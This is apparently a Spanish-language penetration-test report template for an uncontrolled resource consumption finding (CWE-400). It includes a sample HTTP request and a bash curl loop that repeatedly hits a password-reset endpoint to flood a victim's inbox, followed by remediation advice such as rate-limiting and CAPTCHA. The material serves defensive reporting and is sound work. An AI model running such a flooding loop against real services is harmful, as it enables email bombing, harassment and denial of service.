# Uncontrolled Resource Consumption (CWE-400) - {{Alta | Media}}

| Campo | Valor |
|---|---|
| **CVSS Vector** | `CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N` |
| **CVSS Score** | `{{8.2}}` |
| **CWE** | [CWE-400 – Uncontrolled Resource Consumption](https://cwe.mitre.org/data/definitions/400.html) |
| **OWASP** | A04:2021 – Insecure Design / API4:2023 – Unrestricted Resource Consumption |
| **Estado** | {{Abierto}} |

## Descripción

La aplicación no limita el consumo de un recurso costoso (envío de correos/SMS, generación
de reportes, consultas pesadas, subida/descarga de archivos), permitiendo a un atacante
invocarlo de forma masiva. Esto puede causar denegación de servicio, agotamiento de
recursos, costos económicos (proveedores de email/SMS) y abuso de terceros (mail bombing).

## Componentes Afectados

- `{{https://app.cliente.com/password/reset}}` · `{{/reports/generate}}`
- **Parámetros:** `{{email}}`, `{{recurso}}`

## Detalles

Se comprobó que el endpoint `{{/password/reset}}` puede invocarse sin límite, generando el
envío masivo de correos a la víctima (email flooding).

**Paso 1 — Petición del recurso costoso**

```http
POST /password/reset HTTP/1.1
Host: app.cliente.com
Content-Type: application/json

{"email":"victima@cliente.com"}
```

**Paso 2 — Repetición masiva (Burp Intruder / script)**

```bash
for i in $(seq 1 25); do
  curl -s -X POST https://app.cliente.com/password/reset \
    -H "Content-Type: application/json" \
    -d '{"email":"victima@cliente.com"}'
done
# 25 correos enviados a la víctima sin restricción
```

```http
HTTP/1.1 200 OK   // todas las solicitudes procesadas sin límite
```

> _Figura {{N}}: la bandeja de la víctima recibe N correos generados por el ataque (email flooding)._

## Impacto

Permite denegación de servicio, agotamiento de recursos del backend, costos económicos por
uso de servicios de terceros (email/SMS) y acoso/mail bombing a usuarios objetivo.

## Remediación

- Aplicar rate-limiting por usuario, IP y recurso (p. ej. Token Bucket / Fixed Window),
  con límites por minuto/hora.
- Añadir CAPTCHA y throttling en operaciones costosas y limitar tamaño/cantidad de jobs.
- Monitorear y alertar sobre picos de uso anómalos.

## Referencias

- https://cwe.mitre.org/data/definitions/400.html
- https://owasp.org/API-Security/editions/2023/en/0xa4-unrestricted-resource-consumption/
- https://owasp.org/Top10/A04_2021-Insecure_Design/
